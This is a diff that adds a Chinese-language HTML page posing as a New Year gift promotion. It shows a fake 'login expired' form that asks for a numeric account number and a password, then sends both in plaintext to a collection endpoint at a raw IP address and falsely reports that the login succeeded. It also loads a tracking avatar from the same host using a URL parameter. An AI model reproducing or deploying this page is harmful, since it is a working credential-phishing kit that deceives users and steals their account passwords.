@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <title>新春送喜</title>
+    <style type="text/css">
+        *{
+            margin: 0;
+            padding: 0;
+        }
+        html,
+        body {
+            width: 100%;
+            height: 100%;
+        }
+        .banner{
+            width: 100%;
+            vertical-align: middle;
+        }
+        .content {
+            width: 100%;
+            height: 300px;
+            background: #161a3a;
+            margin: 0 auto;
+        }
+        .content_inner{
+            width: 23.3%;
+            margin: 0 auto;
+            padding-top: 20px;
+        }
+        .avatar{
+            display: block;
+            margin: 0 auto;
+            width: 62px;
+            height: 62px;
+            border-radius: 45px;
+            box-sizing: border-box;
+        }
+        .toggle_login{
+            display: none;
+        }
+        .toggle_confirm{
+            display: block;
+        }
+        .toggle_confirm img{
+            display: block;
+            margin: 0 auto;
+        }
+        .alert{
+            color: #fff;
+            margin: 20px auto;
+            width: 100%;
+            text-align: center;
+        }
+        .input_wrap{
+            display: flex;
+            border: 1px solid #abacb8;
+            height: 32px;
+            margin-top: 24px;
+            border-radius: 2px;
+        }
+        .username,
+        .password{
+            display: block;
+            margin: 0 auto;
+            outline: none;
+            border: none;
+            width: 100%;
+            height: 32px;
+            text-indent: 1em;
+            background: #161a3a;
+            color: #fff;
+        }
+        .username{
+            ime-mode: Disabled;
+            -webkti-ime-mode: Disabled;
+        }
+        i img{
+            height: 32px;
+        }
+
+        .btn_wrap{
+            height: 32px;
+            margin-top: 24px;
+            border-radius: 2px;
+        }
+        .btn{
+            font-size: 14px;
+            font-family: '微软雅黑',sans-serif;
+            background: #abacb8;
+            width: 100%;
+            height: 32px;
+            border-radius: 5px;
+            text-align: center;
+            line-height: 32px;
+            cursor: pointer;
+        }
+    </style>
+    <link rel="icon" href="img/favicon.ico">
+</head>
+<body>
+<div class="wrap">
+    <img class="banner" src="img/active.png" alt="">
+    <div class="content">
+        <div class="content_inner">
+            <img src="img/default.png" id="avatar" class="avatar">
+            <div class="toggle_confirm">
+                <img src="img/confirm.png" alt="" id="toggle">
+            </div>
+            <div class="toggle_login">
+                <div class="alert">
+                    <p>登录过期，请重新登录</p>
+                </div>
+                <div class="input_wrap">
+                    <i><img src="img/user.png" alt=""></i>
+                    <input type="text" name="" placeholder="用户名" id="username" class="username">
+                </div>
+                <div class="input_wrap">
+                    <i><img src="img/password.png" alt=""></i>
+                    <input type="password" name="" placeholder="密码" id="password" class="password">
+                </div>
+                <div class="btn_wrap">
+                    <div class="btn" id="btn">登录</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<script type="text/javascript">
+    window.onload = function () {
+        var username = document.querySelector('#username');
+        var password = document.querySelector('#password');
+        var avatar = document.querySelector('#avatar');
+        var btn = document.querySelector('#btn');
+        var toggle = document.querySelector('#toggle');
+        var data = {};
+        var searchStr = getArgs().c;
+        var url = 'http://114.55.118.85:9966/collect/g?c='+searchStr;
+        username.onkeydown = function (ev) {
+            ev = ev || event;
+            var code = ev.keyCode;
+            if((code<58&&code>47)||(code<106&&code>95)||(code==8)||(code==13)){
+
+            }else{
+                return false;
+            }
+        }
+        username.onkeyup = function () {
+            username.value = (username.value.replace(/\D/g, ""));
+        }
+        var xhr = new CreatexmlHttpRequest();
+        xhr.onreadystatechange = function (data) {
+            if(xhr.readyState == 4 && xhr.status == 200){
+                avatar.src = xhr.response;
+            }
+        };
+        xhr.open('GET', url);
+        xhr.send();
+        btn.onclick = function () {
+            data = {
+                u: username.value,
+                p: password.value
+            }
+            var pXhr = new CreatexmlHttpRequest();
+            pXhr.onreadystatechange = function (data) {
+                if(pXhr.readyState == 4 && pXhr.status == 200){
+                    alert('登录成功');
+                    document.querySelector('.toggle_confirm').style.display = 'none';
+                    document.querySelector('.toggle_login').style.display = 'none';
+                }
+            };
+            pXhr.open('POST', 'http://114.55.118.85:9966/collect/c');
+            pXhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            pXhr.send('u='+data.u+'&p='+data.p);
+        }
+        toggle.onclick = function () {
+            document.querySelector('.toggle_confirm').style.display = 'none';
+            document.querySelector('.toggle_login').style.display = 'block';
+        }
+    }
+    //字符串截取
+    var getArgs = function (){ //作用是获取当前网页的查询条件
+        var args = new Object(); //声明一个空对象
+        var query = window.location.search.substring(1); // 取查询字符串，如从http://www.snowpeak.org/testjs.htm?a1=v1&a2=&a3=v3#anchor 中截出 a1=v1&a2=&a3=v3。
+        query=query.split('?')[1];
+        var pairs = query.split("&"); // 以 & 符分开成数组
+        for (var i = 0; i < pairs.length; i++) {
+            var pos = pairs[i].indexOf('='); // 查找 "name=value" 对
+            if (pos == -1) continue; // 若不成对，则跳出循环继续下一对
+            var argname = pairs[i].substring(0, pos); // 取参数名
+            var value = pairs[i].substring(pos + 1); // 取参数值
+            value = decodeURIComponent(value); // 若需要，则解码
+            args[argname] = value; // 存成对象的一个属性
+        }
+        return args; // 返回此对象
+    };
+    function CreatexmlHttpRequest(){
+        if(window.ActiveXObject){
+            xmlHttp=new ActiveXObject("Microsoft.XMLHTTP");
+        }else if(window.XMLHttpRequest)
+            xmlHttp=new XMLHttpRequest();
+        return xmlHttp;
+    }
+
+</script>
+</body>
+</html>
